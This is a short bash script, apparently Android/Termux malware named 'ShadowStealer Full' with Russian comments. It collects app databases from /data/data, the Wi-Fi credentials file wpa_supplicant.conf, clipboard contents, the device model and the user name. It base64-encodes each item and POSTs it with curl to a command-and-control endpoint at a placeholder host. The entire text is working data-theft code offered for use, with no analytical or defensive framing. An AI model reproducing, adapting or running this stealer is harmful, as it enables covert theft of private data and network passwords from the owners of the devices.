#!/bin/bash
# ShadowStealer Full — отправка данных на C2 сервер
C2="https://your-server.com"
ID="shadow_$(date +%s)"

send() {
    curl -sk --max-time 10 -X POST "$C2/api/loot" \
        -d "id=$ID&data=$(echo "$1" | base64 -w0 | head -c 3000)" 2>/dev/null
}

# Собираем и отправляем
for db in $(find /data/data -name "*.db" 2>/dev/null | head -20); do
    send "DB|$(basename $(dirname $db))|$(base64 -w0 "$db" | head -c 5000)"
done

[ -f /data/misc/wifi/wpa_supplicant.conf ] && send "WIFI|$(cat /data/misc/wifi/wpa_supplicant.conf)"
send "CLIP|$(termux-clipboard-get 2>/dev/null)"
send "INFO|$(getprop ro.product.model)|$(whoami)"
